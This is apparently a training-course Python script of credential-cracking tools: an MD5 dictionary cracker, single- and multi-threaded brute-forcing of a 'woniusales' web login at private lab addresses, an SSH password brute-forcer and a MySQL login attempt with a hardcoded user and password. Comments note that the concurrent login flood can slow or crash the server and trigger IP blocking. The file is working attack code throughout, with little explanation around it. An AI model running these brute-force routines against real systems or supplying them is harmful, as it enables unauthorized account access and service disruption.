import hashlib,time,requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
#爆破MD5
import threading

global_lock = threading.Lock()
def md5(source):
    with open('../dict/password-top100k.txt',mode='rb') as file:
        passwordes = file.readlines()

    with open('../dict/password-top6000.txt' ,mode='rb') as file:
        passwordes2 = file.readlines()

    passwordes.append(passwordes2)
    for password in passwordes:
        if hashlib.md5(password.strip()).hexdigest() == source:
            print(f"破译成功,密码为：{password.decode()}")
            return True

    return False

#破译woniusales密码
def wn_single():
    with open('../dict/password-top100k.txt', mode='rb') as file:
        passwordes = file.readlines()

    count = 0 #记录登录次数
    url = 'http://192.168.72.140:8080/woniusales1.4/user/login'

    count = 0
    for password in passwordes:
        data = {'username': 'admin', 'password': password.decode().strip(), 'verifycode': '0000'}
        #print(password.decode().strip())
        resp = requests.post(url=url, data=data)
        #print(resp.text)
        if 'login-fail' not in resp.text:

            print(f'疑似破解成功, 密码为：{password.decode().strip()}')
            print(f"共计尝试 {count} 次.")
            exit()
        count += 1

    print(f"共计尝试 {count} 次.")
    # data = {'username': 'admin', 'password': 'admin123', 'verifycode': '0000'}
    # res = requests.post(url=url,data=data)
    # print(res.text)
    # if 'login-fail' not in res.text:
    #     #print(f"疑似登录成功，密码为{password.strip()}")
    #     print(f"登录次数为{count}")
    #     exit()
    #
    #
    #
    # print(f"共计尝试 {count} 次.")

# 未知用户名，未知密码，多线程并行破解
# 500用户，6000条密码，最多300万次登录操作，
# 同时，由于多线程并发登录，导致服务器压力世增（DOS），进而服务器的响应时间会显著变慢
# 如果服务器不小心崩溃，那么很有可能引起重视，进而检查访问日志，封锁IP，（DDOS可以更好模拟）
# 每个用户一个线程，每一个线程循环6000次
def ws_thread(username):
    with open('../dict/password-top500.txt', mode='rb') as file:
        passwordes = file.readlines()

    count = 0  # 记录登录次数
    url = 'http://192.168.72.140:8080/woniusales1.4/user/login'

    for password in passwordes:
        data = {'username': username, 'password': password.decode().strip(), 'verifycode': '0000'}
        res = requests.post(url, data)

        if 'login-fail' not in res.text:
            print(f"疑似登录成功，用户名为{username},密码为{password.decode().strip()}")
            print(f"登录次数为{count}")
            exit()
        count += 1

    print(f"共计尝试 {count} 次.")


# 如果用户字典有5000条数据，又该如何处理？每个线程处理10个用户。
# 本题的核心：如何给多线程分配任务，此类思路可以解决大部分多线程的常规问题，比如多线程爬虫，扫描工作等。
# 定义一个全局锁以进行同步
conunt=0
def ws_thread10(userlist,passwordes,session):
    url = 'http://192.168.72.140:8080/woniusales1.4/user/login'

    for username in userlist:
        with global_lock:  # 添加线程同步锁
            for password in passwordes:
                data = {'username': username.decode().strip(), 'password': password.decode().strip(),
                        'verifycode': '0000'}
                res = session.post(url, data)

                if 'login-fail' not in res.text:
                    print(f"疑似登录成功，用户名为{username.decode().strip()},密码为{password.decode().strip()}")
                    exit()


def ws_thread10_use():
    # 创建一个连接池适配器
    retry_strategy = Retry(
        total=5,
        backoff_factor=0.1,
        status_forcelist=[500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)

    # 创建一个 Session 对象，并添加连接池适配器
    session = requests.Session()
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    with open('../dict/password-top500.txt', mode='rb') as file:
        passwordes = file.readlines()

    with open('../dict/username-top500.txt', mode='rb') as file:
        user_list = file.readlines()

    num_threads = 10
    for i in range(0, len(user_list), num_threads):
        userlist = user_list[i:i + num_threads]
        # 创建并启动线程
        thread = threading.Thread(target=ws_thread10, args=(userlist, passwordes,session,)).start()

#爆破ssh
def ssh_crack():
    import  paramiko
    with open('../dict/password-top500.txt', mode='rb') as file:
        passwords = file.readlines()

    for password in passwords:
        try:
            print(password.decode().strip())
            transport = paramiko.Transport(('192.168.72.130',22))
            transport.connect(username='ka1',password=password.decode().strip())
            print(f"密码为：{password.decode().strip()}")
        except:
            pass


def mysql_crack():
    import pymysql
    try:
        conn = pymysql.connect(host='192.168.112.188', user='qiang', password='1234567')
        print("成功")
    except:
        pass



if __name__=="__main__":
    # password = 'asddd'
    # source = hashlib.md5(password.encode()).hexdigest()
    #
    # md5(source)

    #wn_single()

    #读取用户字典
    # with open('../dict/username-top500.txt',mode='rb') as file:
    #     user_list = file.readlines()
    #
    # for username in user_list:
    #     print(username.decode().strip())
    #     threading.Thread(target=ws_thread,args=(username.decode().strip(),)).start()

    #ws_thread10_use()

    ssh_crack()


